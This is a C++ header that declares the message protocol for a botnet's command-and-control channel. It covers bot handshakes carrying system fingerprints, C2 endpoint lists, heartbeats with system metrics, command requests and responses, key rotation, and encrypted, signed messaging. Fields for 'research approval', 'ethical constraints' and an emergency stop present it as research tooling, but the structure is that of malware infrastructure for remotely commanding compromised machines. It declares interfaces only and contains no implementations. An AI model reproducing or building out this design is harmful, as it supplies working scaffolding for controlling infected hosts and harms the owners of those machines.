#pragma once

#include <string>
#include <vector>
#include <map>
#include <chrono>
#include <memory>
#include <nlohmann/json.hpp>
#include "crypto/encryption.h"

namespace botnet {
namespace protocol {

/**
 * @brief Message types for bot-C2 communication
 * 
 * Single enum for all platforms - no OS-specific message types needed.
 */
enum class MessageType : uint32_t {
    // Handshake and authentication
    HANDSHAKE_REQUEST = 1000,
    HANDSHAKE_RESPONSE = 1001,
    AUTHENTICATION_REQUEST = 1002,
    AUTHENTICATION_RESPONSE = 1003,
    
    // Regular communication
    HEARTBEAT = 2000,
    COMMAND_REQUEST = 2001,
    COMMAND_RESPONSE = 2002,
    STATUS_UPDATE = 2003,
    
    // Key management
    KEY_ROTATION_REQUEST = 3000,
    KEY_ROTATION_RESPONSE = 3001,
    
    // Research specific
    RESEARCH_LOG = 4000,
    RESEARCH_DATA = 4001,
    
    // Emergency and control
    EMERGENCY_STOP = 9000,
    PING = 9001,
    PONG = 9002
};

/**
 * @brief Priority levels for message handling
 */
enum class MessagePriority : uint8_t {
    LOW = 1,
    NORMAL = 2,
    HIGH = 3,
    CRITICAL = 4,
    EMERGENCY = 5
};

/**
 * @brief Message status codes
 */
enum class MessageStatus : uint32_t {
    SUCCESS = 0,
    PENDING = 1,
    FAILED = 2,
    TIMEOUT = 3,
    INVALID_SIGNATURE = 4,
    ENCRYPTION_ERROR = 5,
    AUTHENTICATION_FAILED = 6,
    RESEARCH_VIOLATION = 7,
    EMERGENCY_STOP_TRIGGERED = 8
};

/**
 * @brief Base message class for all communications
 * 
 * Cross-platform message format using JSON for serialization.
 * Works identically on all operating systems.
 */
class Message {
public:
    // Message header
    struct Header {
        uint32_t version = 1;
        MessageType type;
        MessagePriority priority = MessagePriority::NORMAL;
        std::string message_id;
        std::string correlation_id;  // For request-response matching
        std::chrono::system_clock::time_point timestamp;
        std::chrono::system_clock::time_point expires_at;
        
        // Authentication
        std::string sender_id;
        std::string session_id;
        std::vector<uint8_t> signature;
        
        // Research tracking
        std::string research_session_id;
        bool research_approved = false;
        std::string compliance_token;
        
        nlohmann::json ToJson() const;
        static Header FromJson(const nlohmann::json& json);
    };

public:
    Message(MessageType type, const std::string& sender_id);
    virtual ~Message() = default;

    // Header access
    const Header& GetHeader() const { return header_; }
    void SetCorrelationId(const std::string& correlation_id);
    void SetPriority(MessagePriority priority);
    void SetExpiry(std::chrono::seconds ttl);
    void SetResearchSession(const std::string& session_id, 
                           const std::string& compliance_token);

    // Payload management
    virtual nlohmann::json GetPayload() const = 0;
    virtual void SetPayload(const nlohmann::json& payload) = 0;

    // Serialization (cross-platform JSON)
    std::string Serialize() const;
    std::vector<uint8_t> SerializeBinary() const;
    static std::unique_ptr<Message> Deserialize(const std::string& data);
    static std::unique_ptr<Message> DeserializeBinary(const std::vector<uint8_t>& data);

    // Encryption
    crypto::AESEncryption::EncryptedData Encrypt(const crypto::AESEncryption& encryption) const;
    static std::unique_ptr<Message> Decrypt(const crypto::AESEncryption::EncryptedData& encrypted_data,
                                           const crypto::AESEncryption& encryption);

    // Digital signature
    void Sign(const crypto::RSAKeyPair& key_pair);
    bool VerifySignature(const crypto::RSAKeyPair& public_key) const;

    // Validation
    bool IsValid() const;
    bool IsExpired() const;
    bool IsResearchApproved() const;

    // Message ID generation
    static std::string GenerateMessageId();

protected:
    Header header_;
    
    // Factory method for creating specific message types
    static std::unique_ptr<Message> CreateMessage(MessageType type, const nlohmann::json& payload);
};

/**
 * @brief Handshake request message
 */
class HandshakeRequest : public Message {
public:
    struct HandshakeData {
        std::string client_version;
        std::string platform_info;
        std::string public_key_pem;
        std::string system_fingerprint;
        std::vector<std::string> supported_features;
        bool research_mode_enabled;
        
        nlohmann::json ToJson() const;
        static HandshakeData FromJson(const nlohmann::json& json);
    };

public:
    HandshakeRequest(const std::string& sender_id, const HandshakeData& data);
    
    nlohmann::json GetPayload() const override;
    void SetPayload(const nlohmann::json& payload) override;
    
    const HandshakeData& GetHandshakeData() const { return data_; }

private:
    HandshakeData data_;
};

/**
 * @brief Handshake response message
 */
class HandshakeResponse : public Message {
public:
    struct ResponseData {
        MessageStatus status;
        std::string server_certificate;
        std::string session_key_encrypted;  // RSA encrypted AES key
        std::vector<std::string> enabled_features;
        std::chrono::seconds heartbeat_interval;
        std::vector<std::string> c2_endpoints;
        bool research_mode_accepted;
        
        nlohmann::json ToJson() const;
        static ResponseData FromJson(const nlohmann::json& json);
    };

public:
    HandshakeResponse(const std::string& sender_id, const ResponseData& data);
    
    nlohmann::json GetPayload() const override;
    void SetPayload(const nlohmann::json& payload) override;
    
    const ResponseData& GetResponseData() const { return data_; }

private:
    ResponseData data_;
};

/**
 * @brief Heartbeat message for keep-alive
 */
class HeartbeatMessage : public Message {
public:
    struct HeartbeatData {
        MessageStatus status;
        std::string bot_version;
        std::chrono::system_clock::time_point last_activity;
        uint32_t active_connections;
        uint64_t bytes_sent;
        uint64_t bytes_received;
        std::map<std::string, std::string> system_metrics;
        
        nlohmann::json ToJson() const;
        static HeartbeatData FromJson(const nlohmann::json& json);
    };

public:
    HeartbeatMessage(const std::string& sender_id, const HeartbeatData& data);
    
    nlohmann::json GetPayload() const override;
    void SetPayload(const nlohmann::json& payload) override;
    
    const HeartbeatData& GetHeartbeatData() const { return data_; }

private:
    HeartbeatData data_;
};

/**
 * @brief Command request message
 */
class CommandRequest : public Message {
public:
    struct CommandData {
        std::string command_type;
        nlohmann::json parameters;
        bool requires_response;
        std::chrono::seconds timeout;
        MessagePriority execution_priority;
        
        // Research controls
        bool research_approved;
        std::string approval_reference;
        std::vector<std::string> ethical_constraints;
        
        nlohmann::json ToJson() const;
        static CommandData FromJson(const nlohmann::json& json);
    };

public:
    CommandRequest(const std::string& sender_id, const CommandData& data);
    
    nlohmann::json GetPayload() const override;
    void SetPayload(const nlohmann::json& payload) override;
    
    const CommandData& GetCommandData() const { return data_; }

private:
    CommandData data_;
};

/**
 * @brief Command response message
 */
class CommandResponse : public Message {
public:
    struct ResponseData {
        MessageStatus status;
        std::string error_message;
        nlohmann::json result_data;
        std::chrono::milliseconds execution_time;
        std::string command_correlation_id;
        
        // Research logging
        std::vector<std::string> research_logs;
        bool ethical_compliance_verified;
        
        nlohmann::json ToJson() const;
        static ResponseData FromJson(const nlohmann::json& json);
    };

public:
    CommandResponse(const std::string& sender_id, const ResponseData& data);
    
    nlohmann::json GetPayload() const override;
    void SetPayload(const nlohmann::json& payload) override;
    
    const ResponseData& GetResponseData() const { return data_; }

private:
    ResponseData data_;
};

/**
 * @brief Research log message for ethical compliance
 */
class ResearchLogMessage : public Message {
public:
    struct LogData {
        std::string log_level;
        std::string component;
        std::string event_type;
        std::string description;
        nlohmann::json event_data;
        std::chrono::system_clock::time_point event_timestamp;
        std::string research_session_id;
        
        nlohmann::json ToJson() const;
        static LogData FromJson(const nlohmann::json& json);
    };

public:
    ResearchLogMessage(const std::string& sender_id, const LogData& data);
    
    nlohmann::json GetPayload() const override;
    void SetPayload(const nlohmann::json& payload) override;
    
    const LogData& GetLogData() const { return data_; }

private:
    LogData data_;
};

/**
 * @brief Emergency stop message for safety
 */
class EmergencyStopMessage : public Message {
public:
    struct StopData {
        std::string reason;
        MessagePriority severity;
        bool immediate_shutdown;
        std::string issued_by;
        std::chrono::system_clock::time_point effective_time;
        
        nlohmann::json ToJson() const;
        static StopData FromJson(const nlohmann::json& json);
    };

public:
    EmergencyStopMessage(const std::string& sender_id, const StopData& data);
    
    nlohmann::json GetPayload() const override;
    void SetPayload(const nlohmann::json& payload) override;
    
    const StopData& GetStopData() const { return data_; }

private:
    StopData data_;
};

/**
 * @brief Message factory for creating messages from JSON
 */
class MessageFactory {
public:
    static std::unique_ptr<Message> CreateFromJson(const nlohmann::json& json);
    static std::unique_ptr<Message> CreateFromType(MessageType type, 
                                                  const std::string& sender_id);
    
    // Message type registration (for extensibility)
    using MessageCreator = std::function<std::unique_ptr<Message>(const std::string&, const nlohmann::json&)>;
    static void RegisterMessageType(MessageType type, MessageCreator creator);

private:
    static std::map<MessageType, MessageCreator> message_creators_;
    static void InitializeDefaultCreators();
};

/**
 * @brief Message validation utilities
 */
class MessageValidator {
public:
    struct ValidationResult {
        bool is_valid;
        std::vector<std::string> errors;
        std::vector<std::string> warnings;
    };

public:
    static ValidationResult ValidateMessage(const Message& message);
    static ValidationResult ValidateHandshake(const HandshakeRequest& request);
    static ValidationResult ValidateCommand(const CommandRequest& command);
    
    // Research compliance validation
    static bool IsResearchCompliant(const Message& message);
    static bool ValidateEthicalConstraints(const CommandRequest& command);
    
    // Security validation
    static bool ValidateSignature(const Message& message, const crypto::RSAKeyPair& public_key);
    static bool ValidateTimestamp(const Message& message, std::chrono::seconds tolerance = std::chrono::seconds(300));
};

/**
 * @brief Message compression utilities (for large payloads)
 */
class MessageCompression {
public:
    static std::vector<uint8_t> Compress(const std::vector<uint8_t>& data);
    static std::vector<uint8_t> Decompress(const std::vector<uint8_t>& compressed_data);
    
    static std::string CompressString(const std::string& data);
    static std::string DecompressString(const std::string& compressed_data);
    
    static bool ShouldCompress(size_t data_size, size_t threshold = 1024);
};

} // namespace protocol
} // namespace botnet
